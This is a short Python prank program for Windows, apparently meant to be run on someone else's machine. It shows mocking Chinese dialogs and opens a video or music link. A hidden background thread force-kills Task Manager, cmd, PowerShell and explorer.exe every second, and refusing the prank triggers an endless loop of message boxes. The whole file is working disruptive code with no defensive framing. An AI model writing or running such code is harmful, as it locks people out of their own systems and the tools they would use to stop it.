'''
Author: shu-shu-1 3458222@qq.com
Date: 2022-05-25 19:44:17
LastEditors: shu-shu-1 3458222@qq.com
LastEditTime: 2023-08-12 17:20:01
FilePath: \my_work\Python\你被骗了.py
Description: 

Copyright (c) 2023 by ${git_name_email}, All Rights Reserved. 
'''
import easygui
import webbrowser
import subprocess
from time import sleep
import threading
si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW

def a():
    while 1:
        subprocess.call("taskkill /F /IM Taskmgr.exe", startupinfo=si)
        subprocess.call("taskkill /F /IM cmd.exe", startupinfo=si)
        subprocess.call("taskkill /F /IM powershell.exe", startupinfo=si)
        subprocess.call("taskkill /F /IM explorer.exe", startupinfo=si)
        sleep(1)
a=threading.Thread(target=a, args=(), kwargs={})
a.start()
easygui.msgbox(msg='你 被 骗 了',title='（＾∀＾）',ok_button='我甘愿受骗',image=None,root=None)
xzk = easygui.choicebox("选择受骗方式↓", "你说的哦", ["视频", "音乐","我不"])
if xzk == '视频':
    webbrowser.open_new('https://b23.tv/SnWd9Ev')
elif xzk == '音乐':
    webbrowser.open_new('https://music.163.com/#/song?id=5221167&market=baiduqk')
else:
    easygui.msgbox(msg='你不讲信用！',title='！',ok_button='我知道我完了！',image=None,root=None)
    while True:
        easygui.msgbox(msg='!',title='（＾∀＾）',image=None,root=None)